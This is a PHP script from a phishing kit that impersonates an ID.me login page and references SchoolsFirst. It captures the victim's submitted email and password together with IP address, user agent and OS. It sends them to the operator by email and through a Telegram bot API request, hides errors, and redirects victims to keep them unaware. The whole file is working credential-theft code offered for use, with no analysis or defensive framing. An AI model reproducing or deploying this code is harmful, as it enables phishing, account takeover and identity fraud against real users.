<?php
session_start();
error_reporting(0);
# Adding Settings
include('function.php');
include('../config.php');


$useragent = $_SERVER['HTTP_USER_AGENT'];

$required = array('user_emailii', 'user_passwordii');

$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}
 
if ($error) {
  header('Location: https://www.google.com/search?q=SchoolsFirst+login');
} else {
# Logs

$msgtg = '
🔥== ID.ME II login from {'.$IP.'} ==✅

*🔓Email     * : '.$_POST['user_emailii'].' 
*🔓Password  * : '.$_POST['user_passwordii'].' 

*=========[ DEVICE INFO ]=========*
*IP* : http://www.geoiptool.com/?IP='.$IP.'
*Date* : '.$date.'
*USER AGENT* : '.$_SERVER['HTTP_USER_AGENT'].'
*OS / BR* : '.$os.'
';


if ($settings['send_mail'] == "1"){
  $to = $settings['email'];
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: xforgex <ID.ME@client_site.com>\r\n";
  $subject = "✦ ID.ME II login from ✦ {$IP} ✦";
  $msg = $msgtg;
  mail($to, $subject, $msg, $headers);
   }

 # Send Bot

if ($settings['telegram'] == "1"){
  $data = $msgtg;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/bot{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  }

header('Location: ../auth.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redir');
}
?>